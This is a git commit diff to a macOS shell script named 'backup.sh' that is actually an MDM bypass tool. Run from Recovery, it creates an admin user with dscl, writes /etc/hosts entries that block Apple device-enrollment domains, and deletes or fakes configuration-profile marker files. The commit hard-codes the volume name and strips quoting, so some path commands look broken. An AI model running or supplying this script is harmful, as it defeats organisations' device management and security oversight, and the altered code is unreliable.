ca1cb2539f07c14c4d8b8e90e8ce8127ab538b71
Mohamed El Amine Saidani <mohamed.saidani@univ-constantine2.dz>
2024-09-11 15:10:31 -0700

    Update backup.sh

--- backup.sh
+++ backup.sh
@@ -9,14 +9,8 @@ PUR='\033[1;35m'
 CYAN='\033[1;36m'
 NC='\033[0m'
 
-# Function to get the system volume name
-get_system_volume() {
-    system_volume=$(diskutil info / | grep "Volume Name" | awk -F': ' '{print $2}' | tr -d ' ')
-    echo "$system_volume"
-}
-
-# Get the system volume name
-system_volume=$(get_system_volume)
+# Define fixed volume name with escaped spaces
+volume_name="macOS\ Base\ System"
 
 # Display header
 echo -e "${CYAN}Bypass MDM By Assaf Dori (assafdori.com)${NC}"
@@ -30,8 +24,8 @@ select opt in "${options[@]}"; do
         "Bypass MDM from Recovery")
             # Bypass MDM from Recovery
             echo -e "${YEL}Bypass MDM from Recovery"
-            if [ -d "/Volumes/${system_volume} - Data" ]; then
-                diskutil rename "/Volumes/${system_volume} - Data" "Data"
+            if [ -d /Volumes/${volume_name} - Data ]; then
+                diskutil rename /Volumes/${volume_name} - Data Data
             fi
 
             # Create Temporary User
@@ -46,28 +40,28 @@ select opt in "${options[@]}"; do
             # Create User
             dscl_path='/Volumes/Data/private/var/db/dslocal/nodes/Default'
             echo -e "${GRN}Creating Temporary User"
-            dscl . -create "/Users/$username"
-            dscl . -create "/Users/$username" UserShell "/bin/zsh"
-            dscl . -create "/Users/$username" RealName "$realName"
-            dscl . -create "/Users/$username" UniqueID "501" # Ensure ID is unique
-            dscl . -create "/Users/$username" PrimaryGroupID "20"
-            mkdir "/Volumes/Data/Users/$username"
-            dscl . -create "/Users/$username" NFSHomeDirectory "/Users/$username"
-            dscl . -passwd "/Users/$username" "$passw"
+            dscl . -create /Users/$username
+            dscl . -create /Users/$username UserShell /bin/zsh
+            dscl . -create /Users/$username RealName "$realName"
+            dscl . -create /Users/$username UniqueID "501" # Ensure ID is unique
+            dscl . -create /Users/$username PrimaryGroupID "20"
+            mkdir /Volumes/Data/Users/$username
+            dscl . -create /Users/$username NFSHomeDirectory /Users/$username
+            dscl . -passwd /Users/$username "$passw"
             dscl . -append /Groups/admin GroupMembership "$username"
 
             # Block MDM domains
-            echo "0.0.0.0 deviceenrollment.apple.com" >> /Volumes/"$system_volume"/etc/hosts
-            echo "0.0.0.0 mdmenrollment.apple.com" >> /Volumes/"$system_volume"/etc/hosts
-            echo "0.0.0.0 iprofiles.apple.com" >> /Volumes/"$system_volume"/etc/hosts
+            echo "0.0.0.0 deviceenrollment.apple.com" >> /Volumes/macOS\ Base\ System/etc/hosts
+            echo "0.0.0.0 mdmenrollment.apple.com" >> /Volumes/macOS\ Base\ System/etc/hosts
+            echo "0.0.0.0 iprofiles.apple.com" >> /Volumes/macOS\ Base\ System/etc/hosts
             echo -e "${GRN}Successfully blocked MDM & Profile Domains"
 
             # Remove configuration profiles
             touch /Volumes/Data/private/var/db/.AppleSetupDone
-            rm -rf /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
-            rm -rf /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
-            touch /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
-            touch /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
+            rm -rf /Volumes/macOS\ Base\ System/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
+            rm -rf /Volumes/macOS\ Base\ System/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
+            touch /Volumes/macOS\ Base\ System/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
+            touch /Volumes/macOS\ Base\ System/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
 
             echo -e "${GRN}MDM enrollment has been bypassed!${NC}"
             echo -e "${NC}Exit terminal and reboot your Mac.${NC}"
